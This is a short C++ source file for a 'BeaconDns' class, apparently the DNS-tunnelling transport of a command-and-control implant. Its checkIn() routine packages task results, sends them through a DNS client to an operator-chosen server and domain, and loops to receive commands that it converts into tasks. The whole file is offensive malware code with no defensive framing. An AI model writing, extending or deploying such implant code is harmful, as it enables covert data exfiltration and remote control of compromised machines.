#include "BeaconDns.hpp"

using namespace std;
using namespace dns;


BeaconDns::BeaconDns(std::string& config, const std::string& dnsServer, const std::string& domain)
	: Beacon()
{
	// beacon and modules config
    initConfig(config);
	
	m_client=new Client(dnsServer, domain);
}


BeaconDns::~BeaconDns()
{
	delete m_client;
}


void BeaconDns::checkIn()
{	
	SPDLOG_DEBUG("initConnection");

	std::string output;
	taskResultsToCmd(output);

	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));

	m_client->sendMessage(output);

	std::string input = m_client->getMsg();
	while(!input.empty())
	{
		SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
		cmdToTasks(input);
		input = m_client->getMsg();
	}
}

	



